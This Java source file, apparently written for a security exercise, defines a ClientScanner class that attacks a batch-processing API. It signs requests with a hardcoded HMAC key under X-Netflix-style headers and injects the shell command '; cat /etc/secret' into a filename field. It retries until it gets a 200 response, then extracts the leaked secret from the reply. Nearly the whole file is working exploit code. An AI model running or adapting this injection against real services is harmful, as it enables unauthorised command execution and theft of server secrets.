package org.zcj;

import org.apache.commons.codec.binary.Hex;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.NoSuchAlgorithmException;
import java.time.Instant;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;
import java.util.stream.Collectors;

import static java.net.HttpURLConnection.HTTP_OK;

/**
 * ClientScanner class takes given information about a client (URL, host, Hmac Key)
 * and performs an injection attack to the batch processing API.
 * Each instance of ClientScanner can attack one client at a time.
 */
public class ClientScanner {

    private static final String GIVEN_HMAC_KEY;
    private static final String SHA256;
    private static final String GIVEN_PARTNER_NAME;
    private static final String ATTACK_STRING;
    private static final String PARTNER_HEADER;
    private static final String AUTH_HEADER;
    private static final String SESS_HEADER;
    private static final String SIGN_HEADER;

    static {
        GIVEN_HMAC_KEY = "supersecretpassphrase";
        SHA256 = "HmacSHA256";
        GIVEN_PARTNER_NAME = "foobar";
        ATTACK_STRING = "1-11-2015.txt; cat /etc/secret";
        PARTNER_HEADER = "X-Netflix-PartnerName";
        AUTH_HEADER = "X-Netflix-AuthorizationTime";
        SESS_HEADER = "X-Netflix-Session";
        SIGN_HEADER = "X-Netflix-HeaderSignature";

    }

    private Mac mac = null;
    private final SecretKeySpec keySpec;
    private final HashMap<String, String> netflixHeaders;

    // Constructor for ClientScanner using default/given values
    public ClientScanner() {
        // Initialize headers Map to use for each call. Partner name does not change.
        netflixHeaders = new HashMap<>();
        netflixHeaders.put(PARTNER_HEADER, GIVEN_PARTNER_NAME);

        // Set up our Hashing algorithms
        try {
            mac = Mac.getInstance(SHA256);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        keySpec = new SecretKeySpec(GIVEN_HMAC_KEY.getBytes(StandardCharsets.UTF_8), SHA256);
    }

    /**
     * Attack client is entrypoint to attack 1 client, given its account URL
     * Facilitates calling API as many times as needed to get success(200) response,
     * and returns client secret if found.
     *
     * @param clientURL - account URL of client to attack
     * @return - any secrets found on the client account
     * @throws IOException - throws if it cannot connect to the client URL
     */
    public String attackClient(String clientURL) throws IOException {
        URL url = new URL(clientURL);
        HttpURLConnection http;
        String secretMessage = "";

        int response = 0;
        // Retry any non-200 status codes
        while (response < HTTP_OK || HTTP_OK < response) {
            // Authorization Time should be unique per API call
            this.netflixHeaders.put(AUTH_HEADER, String.valueOf(getAuthTime()));
            // Session ID should be unique per API call
            this.netflixHeaders.put(SESS_HEADER, getSessionID());

            http = sendAttack(url, this.netflixHeaders);
            response = http.getResponseCode();

            if (response == HTTP_OK) {
                String responseMessage = getMessage(http);
                secretMessage = findSecretMessage(responseMessage);
            }
            // Release the HTTP connection
            http.disconnect();
        }
        return secretMessage;
    }

    /**
     * Opens a connection to the client URL, setting appropriate headers, and including
     * the attack string as part of the message.
     *
     * @param url     - Full client account URL to attack
     * @param headers - Map of HeaderName:HeaderValue to set in the request
     * @return - Open HttpURLConnection with client URL
     * @throws IOException if it cannot establish a connection to the client URL
     */
    private HttpURLConnection sendAttack(URL url, HashMap<String, String> headers) throws IOException {
        HttpURLConnection http = (HttpURLConnection) url.openConnection();
        http.setRequestMethod("POST");
        http.setDoOutput(true);
        http.setRequestProperty("Content-Type", "text/html");

        for (Map.Entry<String, String> header : headers.entrySet()) {
            http.setRequestProperty(header.getKey(), header.getValue());
        }
        http.setRequestProperty(SIGN_HEADER, getSignedHeader(headers));
        byte[] body = new StringBuilder("cid=")
                .append(headers.get(SESS_HEADER))   //Same as Session Header value
                .append("&batch=")
                .append(ATTACK_STRING)
                .toString()
                .getBytes(StandardCharsets.UTF_8);

        OutputStream stream = http.getOutputStream();
        stream.write(body);
        return http;
    }

    /**
     * Given an open http connection, returns any messages from the input stream.
     *
     * @param http - Open HttpURLConnection
     * @return - Reply message from the open connection
     * @throws IOException - if it cannot establish an input stream for the http connection
     */
    private String getMessage(HttpURLConnection http) throws IOException {
        BufferedReader br = new BufferedReader(new InputStreamReader(http.getInputStream()));
        String message = br.lines().collect(Collectors.joining(System.lineSeparator()));
        br.close();

        return message;
    }

    /**
     * Helper method to determine if a client response includes a secret message
     *
     * @param fullMessage - The full message returned by the client.
     * @return - The part of the message pertaining to the hacked secret. Or empty if no secret exists.
     */
    private String findSecretMessage(String fullMessage) {
        String secret = "";
        /*
         POST method returns a message formatted with the 'batch' parameter.
         If the attack worked, the secret will be at the end of the message in place of the attack string we appended
        */
        if (!fullMessage.endsWith(ATTACK_STRING)) {
            // Found some secret - means the attack worked
            fullMessage = fullMessage.trim();
            secret = fullMessage.substring(fullMessage.lastIndexOf(" ") + 1);
        }
        return secret;
    }


    /**
     * Constructs a header signature following a predefined method.
     * 1. Convert each header into key=val pair, in alpha order, all lowercase
     * 2. Each key=val pair has no whitespace and is comma delimited.
     * 3. Sign using HMAC-SHA256 using known credentials
     * 4. Signature should be hex encoded
     *
     * @param headers - Map of known 'X-Netflix' specific headers:values to include in the signature
     * @return - Hex encoded, signed header signature following above method
     */
    public String getSignedHeader(HashMap<String, String> headers) {
        // Put given headers in correct format for signing
        String msgToSign = headers.entrySet().stream()
                //Combine key=value paris, all lower case, no whitespace
                .map(e -> e.getKey().toLowerCase().trim() + "=" + e.getValue().toLowerCase().trim())
                // Put in alphabetical order
                .sorted()
                // Combine to make comma delimited
                .collect(Collectors.joining(","));
        // Hash using HMAC SHA 256
        byte[] hashedMsg = getHmacSHA256Hash(msgToSign);
        //Result must be hex encoded
        return Hex.encodeHexString(hashedMsg);
    }

    /**
     * Helper function to sign a message using HMAC-SHA256
     *
     * @param message - String message to sign
     * @return - bytes[] of hashed message
     */
    private byte[] getHmacSHA256Hash(String message) {
        // Sign using HMAC-SHA256
        byte[] hmacSha256;
        try {
            this.mac.init(this.keySpec);
            hmacSha256 = this.mac.doFinal(message.getBytes(StandardCharsets.UTF_8));
        } catch (Exception e) {
            throw new RuntimeException("Failed to calculate HMAC-SHA256", e);
        }
        return hmacSha256;
    }

    /**
     * Helper function to get Authorization Time.
     * Auth Time should be unique per request.
     */
    private long getAuthTime() {
        Instant instant = Instant.now();
        return instant.getEpochSecond();
    }

    /**
     * Helper function to get unique Session ID
     */
    private String getSessionID() {
        return UUID.randomUUID().toString();
    }
}
